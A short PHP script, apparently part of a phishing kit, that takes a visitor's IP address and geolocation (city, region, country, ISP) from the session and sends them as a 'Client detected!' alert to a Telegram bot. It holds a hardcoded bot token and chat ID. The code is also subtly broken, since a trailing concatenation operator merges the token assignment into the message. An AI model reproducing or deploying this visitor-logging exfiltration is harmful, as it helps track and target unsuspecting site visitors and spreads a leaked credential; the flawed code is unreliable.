<?php
session_start();
if (!isset($_SESSION['geoData']) || !isset($_SESSION['user_ip'])) {
    exit("No hay datos de geolocalización disponibles.");
}

$geoData = $_SESSION['geoData'];
$user_ip = $_SESSION['user_ip'];

function sendTelegramMessage($message, $telegramToken, $chatId)
{
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage?chat_id={$chatId}&text=" . urlencode($message) . "&parse_mode=HTML";
    file_get_contents($url);
}

$ciudad = $geoData['location']['city'] ?? 'Desconocido';
$provincia = $geoData['location']['region']['name'] ?? 'Desconocido';
$pais = $geoData['location']['country']['name'] ?? 'Desconocido';
$host = $geoData['connection']['organization'] ?? 'Desconocido';
$isp = $geoData['company']['name'] ?? 'Desconocido';

$alerta = "<b>¡Cliente Detectado!</b>\n\n" .
    "<b>🌆 LocalHost:</b> " . $ciudad . ", " . $provincia . "\n" .
    "<b>🌍 Country:</b> " . $pais . "\n\n" .
    "<b> ISP:</b> " . $isp . "\n\n" .
    "🌐 <b>IP:</b> <code>" . $user_ip . "</code>\n" .

    $telegramToken = '7654853893:AAHjEbHmdICbCWdGv7iHWL8BihdS3zANn5Q';
$chatId = '-4526166950';
sendTelegramMessage($alerta, $telegramToken, $chatId);
